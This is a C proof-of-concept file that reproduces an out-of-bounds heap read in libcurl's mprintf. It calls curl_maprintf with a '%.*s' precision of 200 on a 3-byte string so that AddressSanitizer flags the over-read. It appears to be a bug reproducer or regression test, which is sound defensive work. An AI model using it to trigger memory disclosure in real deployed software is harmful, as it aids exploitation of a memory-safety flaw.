/* PoC for the delocalized %.*s out-of-bounds read in libcurl's mprintf.
 *
 * Drives the public mprintf surface (curl_maprintf) with in-contract input:
 * a NUL-terminated string shorter than the precision given in the format.
 * Per the printf contract, "%.*s" emits at most the precision but stops at
 * the first NUL, so the expected output here is just "hi".
 *
 * On a correct libcurl the conversion stops at the NUL and only the 3-byte
 * allocation is read. On the defective tree out_string() hands the raw
 * precision straight to the non-NUL-aware block emitter, which reads
 * `precision` bytes from the short buffer -> heap-buffer-overflow (ASan).
 *
 * No network required.
 */
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
  /* Tight heap allocation so a read past the NUL hits the ASan redzone. */
  size_t n = strlen("hi");
  char *s = (char *)malloc(n + 1);
  char *out;
  if(!s)
    return 2;
  memcpy(s, "hi", n);
  s[n] = '\0';

  /* In-contract: precision (200) exceeds the string length; printf stops at
     the NUL. A conforming implementation reads only the 3 allocated bytes. */
  out = curl_maprintf("[%.*s]", 200, s);

  if(out) {
    /* Touch the result so the call cannot be optimized away. */
    fputs(out, stdout);
    fputc('\n', stdout);
    curl_free(out);
  }
  free(s);
  return 0;
}
